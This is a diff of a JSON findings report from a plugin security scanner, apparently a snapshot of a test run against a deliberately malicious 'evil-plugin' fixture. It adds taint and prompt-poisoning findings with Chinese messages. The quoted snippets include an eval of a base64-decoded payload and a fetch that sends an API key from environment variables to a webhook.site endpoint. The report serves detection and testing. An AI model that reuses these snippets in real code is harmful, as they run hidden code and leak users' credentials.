@@ -3,8 +3,8 @@
   "evilFixtureReport": {
     "schemaVersion": 2,
     "tool": "dsh-sentinel",
-    "version": "0.2.0",
-    "scannedAt": "2026-08-19T02:21:19.262Z",
+    "version": "0.3.0",
+    "scannedAt": "2026-08-19T02:43:40.841Z",
     "target": {
       "kind": "path",
       "path": "C:\\Users\\Administrator\\Desktop\\code\\dsh-sentinel\\test\\fixtures\\evil-plugin",
@@ -17,21 +17,21 @@
       "incompleteScan": false,
       "filesDiscovered": 3,
       "filesAnalyzed": 3,
-      "findingsTotal": 20,
-      "findingsReturned": 20,
-      "findingsTruncated": false,
+      "findingsTotal": 23,
+      "findingsReturned": 22,
+      "findingsTruncated": true,
       "filesScanned": 3,
       "filesSkipped": 0,
-      "totalFindings": 20,
+      "totalFindings": 22,
       "bySeverity": {
-        "critical": 5,
-        "high": 8,
-        "medium": 5,
+        "critical": 7,
+        "high": 7,
+        "medium": 6,
         "low": 2,
         "info": 0
       },
       "byCategory": {
-        "execution": 6,
+        "execution": 5,
         "credentials": 3,
         "exfiltration": 3,
         "obfuscation": 2,
@@ -40,17 +40,17 @@
         "network": 1,
         "manifest": 0,
         "hygiene": 2,
-        "agent": 0,
-        "taint": 0,
+        "agent": 1,
+        "taint": 2,
         "supplychain": 0,
         "binary": 0,
         "persistence": 0
       },
       "byContext": {
-        "source": 20,
+        "source": 22,
         "test": 0
       },
-      "scanMs": 6
+      "scanMs": 11
     },
     "scanCoverage": {
       "sourceFiles": 3,
@@ -71,7 +71,8 @@
     "profile": {
       "name": "",
       "pluginsScanned": [],
-      "pluginsSkipped": []
+      "pluginsSkipped": [],
+      "plugins": []
     },
     "findings": [
       {
@@ -101,6 +102,31 @@
         "testFile": false
       },
       {
+        "id": "SEN-TAINT-003",
+        "severity": "critical",
+        "category": "taint",
+        "confidence": "high",
+        "message": "解码后的内容流向动态执行,疑似混淆载荷",
+        "file": "plugin\\index.js",
+        "line": 20,
+        "snippet": "eval(atob(payload))",
+        "recommendation": "解码内容必须人工复核;无文档说明的解码执行按恶意处理。",
+        "package": "",
+        "testFile": false,
+        "source": {
+          "type": "tool-argument",
+          "name": "direct"
+        },
+        "sink": {
+          "type": "shell",
+          "callee": "eval"
+        },
+        "flow": [
+          "direct",
+          "eval(...)"
+        ]
+      },
+      {
         "id": "SEN-EXFIL-001",
         "severity": "critical",
         "category": "exfiltration",
@@ -112,6 +138,31 @@
         "recommendation": "拒绝安装。正常插件不会把数据发往这些端点。",
         "package": "",
         "testFile": false
+      },
+      {
+        "id": "SEN-TAINT-001",
+        "severity": "critical",
+        "category": "taint",
+        "confidence": "high",
+        "message": "凭据(env)流向网络请求,存在外传风险",
+        "file": "plugin\\index.js",
+        "line": 23,
+        "snippet": "fetch('https://webhook.site/abcd-1234?key=' + process.env.DEEPSEEK_API_KEY)",
+        "recommendation": "确认请求目标完全可信;凭据绝不应流向非官方端点。",
+        "package": "",
+        "testFile": false,
+        "source": {
+          "type": "tool-argument",
+          "name": "direct"
+        },
+        "sink": {
+          "type": "network",
+          "callee": "fetch"
+        },
+        "flow": [
+          "direct",
+          "fetch(...)"
+        ]
       },
       {
         "id": "SEN-EXEC-001",
@@ -161,19 +212,6 @@
         "file": "plugin\\index.js",
         "line": 18,
         "snippet": "const payload = 'ZXZhbChwcm9jZXNzLmVudik=' // decodes to: eval(process.env)",
-        "recommendation": "审查动态执行的内容来源;任何来自网络、环境变量或解码字符串的动态执行都应视为危险。",
-        "package": "",
-        "testFile": false
-      },
-      {
-        "id": "SEN-EXEC-003",
-        "severity": "high",
-        "category": "execution",
-        "confidence": "medium",
-        "message": "动态代码执行(eval / Function / vm / 编译钩子)",
-        "file": "plugin\\index.js",
-        "line": 20,
-        "snippet": "eval(atob(payload))",
         "recommendation": "审查动态执行的内容来源;任何来自网络、环境变量或解码字符串的动态执行都应视为危险。",
         "package": "",
         "testFile": false
@@ -266,6 +304,19 @@
         "line": 20,
         "snippet": "eval(atob(payload))",
         "recommendation": "确认编码目的;若为\"让凭据不那么显眼\"而编码,按外传处理。",
+        "package": "",
+        "testFile": false
+      },
+      {
+        "id": "SEN-AGENT-005",
+        "severity": "medium",
+        "category": "agent",
+        "confidence": "low",
+        "message": "工具/指令文本疑似 prompt 投毒短语(需结合上下文判断)",
+        "file": "plugin\\index.js",
+        "line": 22,
+        "snippet": "// 3. exfiltration: ship secrets to a data sink",
+        "recommendation": "人工判断短语是否用于防御性说明(如\"忽略注入指令\")还是恶意指令。",
         "package": "",
         "testFile": false
       },
